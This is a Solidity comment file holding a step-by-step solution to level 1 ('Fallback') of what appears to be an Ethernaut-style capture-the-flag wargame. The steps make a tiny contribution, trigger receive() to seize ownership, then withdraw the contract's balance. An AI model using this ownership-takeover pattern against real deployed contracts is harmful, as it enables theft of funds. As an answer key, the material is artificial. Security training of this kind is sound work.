// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title 1. FALLBACK
 * @dev Claim the ownership of the contract and reduce its balance to 0.
 */

/*
1. Start by contributing to fullfill the require statement in the receive() function
await contract.contribute({ value: toWei("0.00001") });

2. Send eth to the contract directly to trigger the receive() function
await contract.sendTransaction({ value: toWei("0.00001") });

3. Withdraw the funds
await contract.withdraw();


🎉 Level completed! 🎉
*/
